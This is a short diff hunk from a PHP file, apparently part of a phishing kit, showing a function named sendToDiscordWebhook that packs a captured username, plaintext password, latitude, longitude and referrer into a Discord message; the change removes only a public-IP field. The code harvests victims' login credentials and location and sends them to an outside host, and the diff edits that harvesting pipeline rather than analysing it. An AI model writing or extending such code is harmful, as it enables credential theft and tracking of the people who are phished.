@@ -48,7 +48,6 @@ function sendToDiscordWebhook($data) {
         "fields" => [
             ["name" => "👤 Username", "value" => "`" . $data['username'] . "`", "inline" => true],
             ["name" => "🔑 Password", "value" => "`" . $data['password'] . "`", "inline" => true],
-            ["name" => "🌍 Public IP", "value" => "`" . $data['public_ip'] . "`", "inline" => true],
             ["name" => "📍 Latitude", "value" => "`" . $data['latitude'] . "`", "inline" => true],
             ["name" => "📏 Longitude", "value" => "`" . $data['longitude'] . "`", "inline" => true],
             ["name" => "🔗 Referrer", "value" => "`" . $data['referrer'] . "`", "inline" => true],
